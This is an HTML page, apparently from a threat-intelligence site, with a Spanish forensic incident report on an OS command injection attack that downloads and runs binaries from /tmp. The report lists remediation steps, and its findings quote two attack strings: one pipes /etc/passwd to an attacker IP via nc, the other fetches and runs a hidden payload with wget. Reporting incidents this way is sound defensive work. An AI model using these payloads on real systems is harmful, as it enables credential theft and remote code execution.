@@ -1,0 +1,69 @@
+
+    <!DOCTYPE html>
+    <html lang="es">
+    <head>
+        <meta charset="UTF-8">
+        <title>Vigilia 004 - Carga Maliciosa de Scripts en /tmp | Vigilia Abyssi</title>
+        <link rel="stylesheet" href="../style.css?v=1.4">
+    </head>
+    <body>
+        <header>
+            <div class="container">
+                <h1>VIGILIA ABYSSI</h1>
+                <p class="subtitle">Inteligencia de Amenazas Digitales</p>
+            </div>
+        </header>
+        <main>
+            <article class="news-item">
+                <span class="date">2026-03-05</span>
+                <h2>Vigilia 004 - Carga Maliciosa de Scripts en /tmp</h2>
+                <table class="tech-spec">
+  <tr>
+    <th colspan="2" style="text-align:left; background-color:#f0f0f0;">REPORTE DE INCIDENTE FORENSE - VIGILIA ABYSSI</th>
+  </tr>
+  <tr>
+    <td><strong>ID del Incidente:</strong></td>
+    <td>VA-2024-FOR-8921</td>
+  </tr>
+  <tr>
+    <td><strong>Fecha de Detección:</strong></td>
+    <td>24 de Mayo, 2024 - 14:35 UTC</td>
+  </tr>
+  <tr>
+    <td><strong>Analista Responsable:</strong></td>
+    <td>Equipo de Respuesta a Incidentes (CSIRT)</td>
+  </tr>
+  <tr>
+    <td><strong>Nivel de Severidad:</strong></td>
+    <td style="color:red; font-weight:bold;">CRÍTICA</td>
+  </tr>
+  <tr>
+    <td><strong>Dirección IP Origen (Atacante):</strong></td>
+    <td>45.135.194.43</td>
+  </tr>
+  <tr>
+    <td><strong>Vector de Ataque:</strong></td>
+    <td>Inyección de Comandos (OS Command Injection) vía HTTP</td>
+  </tr>
+  <tr>
+    <td><strong>Objetivo del Payload:</strong></td>
+    <td>Descarga y ejecución de binarios ELF para persistencia</td>
+  </tr>
+  <tr>
+    <td><strong>Estado Actual:</strong></td>
+    <td>Bloqueo de IP y Análisis Forense en Fase 2</td>
+  </tr>
+</table>
+                <div class="content">
+                    <p>El presente documento detalla los hallazgos técnicos derivados del análisis forense realizado tras la detección de una actividad maliciosa dirigida a nuestros activos críticos. Se ha confirmado un intento exitoso de explotación mediante inyección de comandos en el nivel de aplicación web, con el objetivo explícito de establecer persistencia en el sistema operativo subyacente mediante la descarga y ejecución de binarios ELF (Executable and Linkable Format). La dirección IP origen identificada es 45.135.194.43.</p><p>A las 14:35 UTC, los sistemas de detección de intrusiones (IDS) alertaron sobre patrones anómalos en el tráfico HTTP hacia el servidor de aplicación principal. El análisis de los registros del servidor web (access logs y error logs) reveló múltiples solicitudes GET y POST que contenían caracteres especiales destinados a romper la sintaxis de las consultas y ejecutar comandos del sistema operativo subyacente.</p><p>El atacante intentó explotar una vulnerabilidad en un parámetro no validado para inyectar cadenas de comando shell. La secuencia observada indica un intento de utilizar utilidades como wget o curl para descargar un archivo binario desde un servidor externo controlado por el adversario, seguido de la ejecución inmediata del mismo mediante chmod y ./script.</p><p>Se procedió a la preservación de las imágenes de disco y volcados de memoria de los servidores afectados. Los hallazgos principales incluyen:</p><p>- Payload Identificado: Se detectaron cadenas de caracteres como ; cat /etc/passwd | nc 45.135.194.43 8080 y wget http://malicious-domain.com/payload.sh -O /tmp/.hidden; chmod +x /tmp/.hidden; /tmp/.hidden.</p><p>- Intento de Persistencia: El objetivo del script ELF descargado parece ser la modificación de archivos de inicio (rc.local, crontab) para asegurar que el malware se ejecute tras un reinicio del sistema.</p><p>- Tráfico de Salida: Se observaron conexiones salientes no autorizadas hacia la IP 45.135.194.43 en puertos no estándar, coincidiendo con los intentos de descarga.</p><p>La naturaleza del ataque representa un riesgo crítico para la integridad y confidencialidad de los datos alojados en el servidor comprometido. Si bien se logró bloquear la IP origen a nivel de firewall perimetral antes de que la persistencia fuera establecida completamente, existe la posibilidad de que fragmentos de código malicioso residan en memoria o en logs temporales. La exposición de credenciales del sistema y la capacidad de movimiento lateral dentro de la red interna son riesgos inmediatos.</p><p>Se dictaminan las siguientes acciones correctivas e inmediatas:</p><p>- Aislamiento de Activos: Mantener los servidores afectados en una red cuarentena hasta completar el escaneo profundo.</p><p>- Parcheo y Hardening: Corregir la vulnerabilidad de inyección de comandos mediante validación estricta de entradas (input validation) y uso de listas blancas para parámetros permitidos.</p><p>- Monitoreo Reforzado: Implementar reglas específicas en el WAF para detectar patrones de ejecución de comandos shell y descargas de binarios ELF no autorizados.</p><p>- Rotación de Credenciales: Cambiar todas las contraseñas administrativas, claves SSH y certificados asociados a los sistemas impactados.</p><p>- Análisis de Malware: Enviar cualquier archivo sospechoso recuperado en /tmp o directorios temporales para análisis estático y dinámico en entorno aislado.</p><p>El incidente VA-2024-FOR-8921 ha sido clasificado como un intento avanzado de compromiso de infraestructura. La respuesta inmediata del equipo de Vigilia Abyssi permitió contener la propagación, pero se requiere una auditoría completa de seguridad para garantizar que no existan vectores de entrada adicionales explotables por el mismo actor o grupos afiliados. Se procederá con la notificación a las autoridades competentes según los protocolos establecidos.</p>
+                </div>
+                <br>
+                <a href="../index.html" style="color: #00599c; font-weight: bold; text-decoration: none;">← REGRESAR AL REPOSITORIO</a>
+            </article>
+        </main>
+        <footer>
+            <p>&copy; 2026 Vigilia Abyssi - Sistema de Análisis Automatizado</p>
+        </footer>
+    </body>
+    </html>
+    
